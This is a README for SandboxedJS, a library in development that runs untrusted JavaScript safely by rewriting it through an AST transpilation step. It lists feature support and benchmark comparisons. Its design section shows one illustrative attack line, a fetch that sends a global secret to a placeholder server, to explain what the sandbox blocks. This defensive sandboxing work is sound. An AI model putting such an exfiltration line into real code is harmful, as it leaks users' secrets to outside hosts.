# SandboxedJS

Sandbox untrusted/arbitrary JavaScript code and safely execute it in isolation.

## Performance

Run `npm run benchmark` to benchmark SandboxedJS's `saveEval` against a native js `eval`. Currently most benchmarks comparisons show SandboxedJS is **~20x** slower than native JS. However, if you don't count the time required to transpile the code, execution time can be between **~1.3x to ~20x** slower than native JS, depending on the kind of work being performed. The goal for the MVP is to just get this thing working in a secure manner (breaking out of sandbox should be impossible), and optimizations can come later.

## Status

Under active development. Looking for others to help out!

## JS Support 

| Feature | Status |
| ------- | ------ |
| primitives | ✅ |
| `number` | ✅ |
| `string` | ✅ |
| `boolean` | ✅ |
| `null` | ✅ |
| `undefined` | ✅ |
| `bigint` | ✅ |
| `symbol` | ⚠️ |
| autoboxing primitives to objects | ⚠️ works for some types like `Number` |
| binary operators (`+`, `-`, `%`, etc.) | ✅ |
| unary operators  (`+`, `-`, `typeof`, etc.) | ✅ |
| simple objects (i.e. `{a: true}`) | ✅ |
| arrays | ✅ |
| functions | ✅ |
| `this` | ⚠️ |
| `arguments` | ✅ |
| local variables | ✅ |
| assignment | ✅ |
| global variables | ⚠️ |
| prototypes | ⚠️ |
| `Object` global | ⚠️ |
| ternary operators | ❌ |
| global variables | ❌ |


| Legend |  |
| ------- | ------ |
| ✅ | Finished  |
| ⚠️ | In development  |
| ❌ | Haven't started work  |

## Comparison of JS in JS Implementations

| Name | Link | Performance |
| ----------- | ----------- | --------- |
| SandboxedJS |  | ~20x slower than native |
| js.js | https://github.com/jterrace/js.js/ | [~200x slower than native]()https://github.com/jterrace/js.js/#status |
| JS-Interpreter | https://github.com/NeilFraser/JS-Interpreter/ | [~200x slower than native](https://github.com/NeilFraser/JS-Interpreter/issues/227) |


## Design

Let's say we want to sandbox the following untrusted JS code:

```js
fetch("https://api.example.com?stolenSecret=" + window.globalValue);
```

In this example, the untrusted code is attempting to grab a global value it should NOT have access to and pass the value to its server. If this code was naively run with `eval`, the host environment would be compromised.

To make untrusted JS code safe to run, SandboxedJS rewrites the untrusted code using a JS-to-JS transpilation step. Then it is safe to run `eval` on the transpiled js code. The resulting transpiled code of the above example might look something as follows:

```js
sContext.sLookUp("fetch").sCall([
  SBinaryOps.sBinaryAdd(
    new SStringValue("https://api.example.com?stolenSecret="),
    sContext.sLookUp("window").sLookUp("globalValue")
  )
])
```

Note, the "s" prefix is short for "sandboxed".

To produce this code, SandboxedJS uses [acorn](https://github.com/acornjs/acorn) to produce an AST of the untrusted JS. It then walks the entire AST and emits each piece of the tree in the format above.

## Running Locally

Install deps: `npm i`

Run benchmarks: `npm run benchmark`

Run tests: `npm test`

Build to `lib` folder: `npm run build`

## Unique Features

 - Add metadata to any JS value which is invisible to the client (untrusted) JS code but visible to the host environment.
